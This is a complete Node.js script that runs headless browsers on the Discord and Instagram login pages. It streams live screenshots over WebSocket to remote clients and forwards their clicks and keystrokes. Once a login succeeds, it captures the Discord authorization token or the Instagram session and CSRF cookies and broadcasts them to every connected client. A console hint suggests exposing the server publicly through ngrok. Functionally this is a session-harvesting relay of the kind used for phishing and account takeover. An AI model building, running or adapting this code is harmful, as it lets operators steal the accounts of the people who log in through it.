#!/usr/bin/env node
// ══════════════════════════════════════════════════════════
// playwright-server.js — Discord + Instagram login server
//
// Runs both services simultaneously. Each gets its own
// browser instance. Clients connect via query param:
//
// Usage:
//   node playwright-server.js
//
// WebSocket:
//   ws://localhost:3000/stream?type=discord
//   ws://localhost:3000/stream?type=instagram
//
// Quick start:
//   bash contribute.sh
// ══════════════════════════════════════════════════════════

const http = require('http');
const fs = require('fs');
const path = require('path');
const { WebSocketServer } = require('ws');
const { chromium } = require('playwright');

// ── Config ───────────────────────────────────────────────
const CONFIG_PATH = path.join(__dirname, 'config.json');
let CFG = { discord: { email: '', password: '' }, instagram: { username: '', password: '' } };
try {
    const raw = JSON.parse(fs.readFileSync(CONFIG_PATH, 'utf8'));
    CFG.discord.email      = raw.discord?.email      || '';
    CFG.discord.password   = raw.discord?.password   || '';
    CFG.instagram.username = raw.instagram?.username || '';
    CFG.instagram.password = raw.instagram?.password || '';
} catch (_) {}

const PORT = process.env.PORT || 3000;
const BROWSER_WIDTH = 1280;
const BROWSER_HEIGHT = 720;
const SCREENSHOT_INTERVAL_MS = 100; // 10fps
const SCREENSHOT_QUALITY = 70;      // JPEG quality
const MAX_CLIENTS = 3;              // per service

const URLS = {
    discord:   'https://discord.com/login',
    instagram: 'https://www.instagram.com/accounts/login/'
};

const LAUNCH_ARGS = [
    '--disable-gpu',
    '--no-sandbox',
    '--disable-dev-shm-usage',
    '--disable-background-networking',
    '--disable-sync',
    '--no-first-run',
    '--disable-extensions'
];

const CHROME_UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36';

// ── Per-service state ─────────────────────────────────────
const SVC = {
    discord: {
        browser: null, page: null,
        screenshotInterval: null,
        tokenCaptured: false,
        capturedToken: null,
        clients: new Set()
    },
    instagram: {
        browser: null, page: null,
        screenshotInterval: null,
        tokenCaptured: false,
        capturedSession: null,
        clients: new Set()
    }
};

// ── HTTP Server ───────────────────────────────────────────
const server = http.createServer((req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') { res.writeHead(204); res.end(); return; }

    if (req.url === '/status' && req.method === 'GET') {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({
            ok: true,
            discord:   { ready: !!SVC.discord.page,   clients: SVC.discord.clients.size,   captured: SVC.discord.tokenCaptured,   hasCachedToken: !!SVC.discord.capturedToken },
            instagram: { ready: !!SVC.instagram.page, clients: SVC.instagram.clients.size, captured: SVC.instagram.tokenCaptured, hasCachedSession: !!SVC.instagram.capturedSession }
        }));
        return;
    }

    res.writeHead(404); res.end('Not found');
});

// ── WebSocket Server ──────────────────────────────────────
// Connect to /stream?type=discord or /stream?type=instagram
const wss = new WebSocketServer({ server });

wss.on('connection', (ws, req) => {
    const parsed = new URL(req.url, 'http://localhost');
    const isStream = parsed.pathname === '/stream' || parsed.pathname === '/stream/';
    const svcName = isStream ? (parsed.searchParams.get('type') || '').toLowerCase() : '';

    if (!SVC[svcName]) { ws.close(1008, 'Invalid type — use ?type=discord or ?type=instagram'); return; }

    const svc = SVC[svcName];

    if (svc.clients.size >= MAX_CLIENTS) {
        ws.close(1013, 'Too many clients');
        return;
    }

    svc.clients.add(ws);
    console.log(`[${svcName}] Client connected (${svc.clients.size} total)`);

    ws.on('close', () => {
        svc.clients.delete(ws);
        console.log(`[${svcName}] Client disconnected (${svc.clients.size} remaining)`);
    });

    ws.on('error', () => svc.clients.delete(ws));

    ws.on('message', async (raw) => {
        let msg;
        try { msg = JSON.parse(raw); } catch (_) { return; }

        if (msg.type === 'reset') {
            if (!svc.tokenCaptured) return;
            console.log(`[${svcName}] Reset requested — relaunching browser`);
            svc.tokenCaptured = false;
            svc.capturedSession = null;
            svc.capturedToken = null;
            broadcast(svc, { type: 'status', text: 'Relaunching browser for fresh login...' });
            try { await closeBrowser(svc, svcName); } catch (_) {}
            try {
                await launchBrowser(svcName);
                startScreenshots(SVC[svcName], svcName);
            } catch (e) {
                console.error(`[${svcName}] Relaunch failed:`, e.message);
                broadcast(svc, { type: 'error', message: 'Failed to relaunch browser.' });
            }
            return;
        }

        if (!svc.page) return;
        await handleInput(svc, msg);
    });

    if (svc.tokenCaptured) {
        if (svcName === 'instagram' && svc.capturedSession) {
            send(ws, { type: 'session', ...svc.capturedSession });
        } else if (svcName === 'discord' && svc.capturedToken) {
            send(ws, { type: 'token', token: svc.capturedToken });
        } else {
            send(ws, { type: 'status', text: 'Session expired — click Connect to re-login' });
        }
        return;
    }
    send(ws, { type: 'status', text: 'Connected — log in to continue' });

    if (svc.page && !svc.tokenCaptured) {
        svc.page.screenshot({ type: 'jpeg', quality: SCREENSHOT_QUALITY })
            .then(buf => send(ws, { type: 'screenshot', data: buf.toString('base64'), width: BROWSER_WIDTH, height: BROWSER_HEIGHT }))
            .catch(() => {});
    }
});

function send(ws, data) {
    if (ws.readyState === ws.OPEN) {
        try { ws.send(JSON.stringify(data)); } catch (_) {}
    }
}

function broadcast(svc, data) {
    const json = JSON.stringify(data);
    for (const ws of svc.clients) {
        if (ws.readyState === ws.OPEN) {
            try { ws.send(json); } catch (_) {}
        }
    }
}

// ── Input handling ────────────────────────────────────────
async function handleInput(svc, msg) {
    if (!svc.page) return;
    try {
        const bx = (msg.x ?? 0) * BROWSER_WIDTH;
        const by = (msg.y ?? 0) * BROWSER_HEIGHT;
        switch (msg.type) {
            case 'mousemove': await svc.page.mouse.move(bx, by); break;
            case 'click':     await svc.page.mouse.click(bx, by, { button: msg.button || 'left' }); break;
            case 'dblclick':  await svc.page.mouse.dblclick(bx, by); break;
            case 'mousedown': await svc.page.mouse.down({ button: msg.button || 'left' }); break;
            case 'mouseup':   await svc.page.mouse.up({ button: msg.button || 'left' }); break;
            case 'scroll':    await svc.page.mouse.wheel(msg.deltaX || 0, msg.deltaY || 0); break;
            case 'keydown':   if (msg.key) await svc.page.keyboard.down(normalizeKey(msg.key)); break;
            case 'keyup':     if (msg.key) await svc.page.keyboard.up(normalizeKey(msg.key)); break;
            case 'input':     if (msg.text) await svc.page.keyboard.type(msg.text); break;
        }
    } catch (_) {}
}

function normalizeKey(key) {
    const map = {
        ' ': 'Space', 'ArrowLeft': 'ArrowLeft', 'ArrowRight': 'ArrowRight',
        'ArrowUp': 'ArrowUp', 'ArrowDown': 'ArrowDown', 'Backspace': 'Backspace',
        'Delete': 'Delete', 'Enter': 'Enter', 'Tab': 'Tab', 'Escape': 'Escape',
        'Shift': 'Shift', 'Control': 'Control', 'Alt': 'Alt', 'Meta': 'Meta',
        'CapsLock': 'CapsLock', 'Home': 'Home', 'End': 'End',
        'PageUp': 'PageUp', 'PageDown': 'PageDown',
    };
    return map[key] || key;
}

// ── Screenshot loops ──────────────────────────────────────
function startScreenshots(svc, svcName) {
    if (svc.screenshotInterval) return;
    svc.screenshotInterval = setInterval(async () => {
        if (!svc.page || svc.clients.size === 0 || svc.tokenCaptured) return;
        try {
            const buf = await svc.page.screenshot({ type: 'jpeg', quality: SCREENSHOT_QUALITY });
            broadcast(svc, { type: 'screenshot', data: buf.toString('base64'), width: BROWSER_WIDTH, height: BROWSER_HEIGHT });
        } catch (_) {}
    }, SCREENSHOT_INTERVAL_MS);
}

function stopScreenshots(svc) {
    if (svc.screenshotInterval) { clearInterval(svc.screenshotInterval); svc.screenshotInterval = null; }
}

// ── Token extraction ──────────────────────────────────────
function setupDiscordCapture(svc) {
    svc.page.on('request', (request) => {
        if (svc.tokenCaptured) return;
        if (!request.url().includes('discord.com/api/')) return;
        const auth = request.headers()['authorization'];
        if (auth && auth.length > 20 && !auth.startsWith('undefined')) {
            svc.tokenCaptured = true;
            svc.capturedToken = auth;
            stopScreenshots(svc);
            console.log('[discord] Token captured!');
            broadcast(svc, { type: 'token', token: auth });
            setTimeout(() => closeBrowser(svc, 'discord'), 3000);
        }
    });
}

function setupInstagramCapture(svc) {
    let polling = false;
    svc.page.on('framenavigated', async () => {
        if (svc.tokenCaptured || polling) return;
        const url = svc.page.url();
        if (url.includes('/login') || url.includes('/challenge') || url.includes('/accounts/')) return;
        polling = true;
        try {
            await svc.page.waitForTimeout(1500);
            const cookies = await svc.page.context().cookies('https://www.instagram.com');
            const sessionCookie = cookies.find(c => c.name === 'sessionid');
            const csrfCookie    = cookies.find(c => c.name === 'csrftoken');
            if (sessionCookie?.value) {
                svc.tokenCaptured = true;
                svc.capturedSession = { sessionId: sessionCookie.value, csrfToken: csrfCookie?.value || '' };
                stopScreenshots(svc);
                console.log('[instagram] Session captured!');
                broadcast(svc, { type: 'session', ...svc.capturedSession });
                setTimeout(() => closeBrowser(svc, 'instagram'), 3000);
            }
        } catch (_) {}
        polling = false;
    });
}

// ── Browser lifecycle ─────────────────────────────────────
async function launchBrowser(svcName) {
    const svc = SVC[svcName];
    console.log(`[${svcName}] Launching Chromium...`);

    svc.browser = await chromium.launch({ headless: true, args: LAUNCH_ARGS });
    const context = await svc.browser.newContext({
        viewport: { width: BROWSER_WIDTH, height: BROWSER_HEIGHT },
        userAgent: CHROME_UA
    });
    svc.page = await context.newPage();

    if (svcName === 'discord') setupDiscordCapture(svc);
    else setupInstagramCapture(svc);

    console.log(`[${svcName}] Navigating to ${URLS[svcName]}...`);
    await svc.page.goto(URLS[svcName], { waitUntil: 'domcontentloaded' });

    // Auto-fill if credentials are set
    if (svcName === 'discord' && CFG.discord.email && CFG.discord.password) {
        console.log('[discord] Auto-filling credentials...');
        try {
            await svc.page.fill('input[name="email"]', CFG.discord.email);
            await svc.page.fill('input[name="password"]', CFG.discord.password);
            await svc.page.click('button[type="submit"]');
        } catch (_) { console.log('[discord] Auto-fill failed — waiting for manual login'); }
    } else if (svcName === 'instagram' && CFG.instagram.username && CFG.instagram.password) {
        console.log('[instagram] Auto-filling credentials...');
        try {
            await svc.page.fill('input[name="username"]', CFG.instagram.username);
            await svc.page.fill('input[name="password"]', CFG.instagram.password);
            await svc.page.click('button[type="submit"]');
        } catch (_) { console.log('[instagram] Auto-fill failed — waiting for manual login'); }
    }

    broadcast(svc, { type: 'status', text: 'Browser ready — log in below' });
    startScreenshots(svc, svcName);
    console.log(`[${svcName}] Ready.`);
}

async function closeBrowser(svc, svcName) {
    stopScreenshots(svc);
    if (svc.browser) {
        try { await svc.browser.close(); } catch (_) {}
        svc.browser = null;
        svc.page = null;
    }
    console.log(`[${svcName}] Browser closed.`);
}

// ── Start ─────────────────────────────────────────────────
server.listen(PORT, async () => {
    console.log(`\nPlaywright streaming server on port ${PORT}`);
    console.log(`  Discord   → ws://localhost:${PORT}/stream?type=discord`);
    console.log(`  Instagram → ws://localhost:${PORT}/stream?type=instagram`);
    console.log(`  Status    → http://localhost:${PORT}/status`);
    console.log(`\nExpose with: ngrok http ${PORT}\n`);

    // Launch both browsers in parallel
    const results = await Promise.allSettled([
        launchBrowser('discord'),
        launchBrowser('instagram')
    ]);

    for (const [i, r] of results.entries()) {
        const name = i === 0 ? 'discord' : 'instagram';
        if (r.status === 'rejected') {
            const msg = r.reason?.message || '';
            if (msg.includes("Executable doesn't exist")) {
                console.error(`\nChromium not installed. Run: npx playwright install chromium`);
                process.exit(1);
            }
            console.error(`[${name}] Failed to launch:`, msg);
        }
    }
});

process.on('SIGINT', async () => {
    console.log('\nShutting down...');
    await Promise.allSettled([
        closeBrowser(SVC.discord, 'discord'),
        closeBrowser(SVC.instagram, 'instagram')
    ]);
    server.close();
    process.exit(0);
});
